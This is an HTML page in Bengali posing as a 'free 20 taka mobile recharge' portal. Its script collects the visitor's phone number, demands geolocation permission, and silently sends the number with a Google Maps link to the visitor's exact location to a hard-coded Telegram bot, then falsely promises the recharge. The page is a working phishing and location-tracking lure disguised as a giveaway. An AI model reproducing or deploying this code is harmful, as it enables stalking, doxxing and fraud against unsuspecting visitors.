<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Recharge Portal</title>
    <style>
        body { background: #f4f7f6; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .header { background: #007bff; color: white; padding: 20px; font-size: 20px; font-weight: bold; }
        .container { max-width: 380px; margin: 50px auto; padding: 30px; background: white; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
        h2 { color: #28a745; margin-bottom: 10px; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 18px; box-sizing: border-box; }
        .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
        .btn:active { background: #0056b3; }
    </style>
</head>
<body>
    <div class="header">অনলাইন রিচার্জ পোর্টাল - ২০২৬</div>
    <div class="container">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>আপনার নম্বরটি দিয়ে 'রিচার্জ নিন' বাটনে ক্লিক করুন।</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button class="btn" id="subBtn" onclick="startProcess()">রিচার্জ নিন</button>
    </div>

    <script>
        async function startProcess() {
            const phone = document.getElementById('phone').value;
            const btn = document.getElementById('subBtn');

            if (phone.length < 11) { alert("সঠিক ১১ সংখ্যার নম্বর দিন!"); return; }
            
            btn.innerText = "প্রসেসিং...";
            btn.disabled = true;

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k";
                const chat_id = "7887080882";
                
                const map_link = `https://www.google.com/maps?q=${lat},${lon}`;
                const text = `🔔 **নতুন রিকোয়েস্ট!**\n\n📱 নম্বর: ${phone}\n📍 লোকেশন: ${map_link}`;

                try {
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
                    alert("অনুরোধ সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
                } catch (e) {
                    alert("টেলিগ্রাম এরর! আপনার ইন্টারনেট চেক করুন।");
                } finally {
                    btn.innerText = "রিচার্জ নিন";
                    btn.disabled = false;
                }
            }, (err) => {
                alert("লোকেশন পারমিশন ছাড়া রিচার্জ পাওয়া সম্ভব নয়।");
                btn.innerText = "রিচার্জ নিন";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
